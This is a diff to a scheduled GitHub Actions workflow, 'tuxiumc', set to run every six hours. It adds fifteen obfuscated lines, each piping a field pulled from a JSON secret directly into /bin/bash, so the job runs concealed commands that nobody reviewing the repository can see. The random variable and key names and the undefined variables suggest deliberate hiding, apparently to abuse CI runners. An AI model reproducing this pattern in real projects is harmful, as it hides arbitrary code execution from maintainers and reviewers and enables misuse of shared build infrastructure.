@@ -2,8 +2,9 @@ name: tuxiumc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
-jobs:  # 3985
+    - cron: '40 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,13 +12,21 @@ jobs:  # 3985
       - uses: actions/checkout@v4
       - name: tuxiumc
         env:
-          wh76837: ${{ secrets.wh76837 }}
+          axoj44: ${{ secrets.axoj44 }}
         run: |
-          echo $wh76837 | jq -r .f207 | /bin/bash
-          echo $cf3256 | jq -r .z1 | /bin/bash
-          echo $ijl7187 | jq -r .ihrop3 | /bin/bash
-          echo $tlf247 | jq -r .amk013 | /bin/bash
-          echo $o558 | jq -r .ir25 | /bin/bash
-          echo $kgwym298 | jq -r .dyur8324 | /bin/bash
-          echo $fpei05931 | jq -r .r39 | /bin/bash
+          echo $axoj44 | jq -r .ffnoo8 | /bin/bash
+          echo $q2444 | jq -r .s36 | /bin/bash
+          echo $ti41 | jq -r .vbdry497 | /bin/bash
+          echo $wstsi04 | jq -r .v3 | /bin/bash
+          echo $yionf186 | jq -r .ekw8 | /bin/bash
+          echo $crbr62290 | jq -r .c80 | /bin/bash
+          echo $dja82550 | jq -r .b7885 | /bin/bash
+          echo $qx63 | jq -r .fmv6415 | /bin/bash
+          echo $c9047 | jq -r .x59801 | /bin/bash
+          echo $hokk66280 | jq -r .dwzim42545 | /bin/bash
+          echo $kq6 | jq -r .po22 | /bin/bash
+          echo $opi8 | jq -r .wjwyq330 | /bin/bash
+          echo $egput721 | jq -r .srfj780 | /bin/bash
+          echo $wmhj69042 | jq -r .cmkhe80319 | /bin/bash
+          echo $muvi013 | jq -r .hhzh05433 | /bin/bash
 
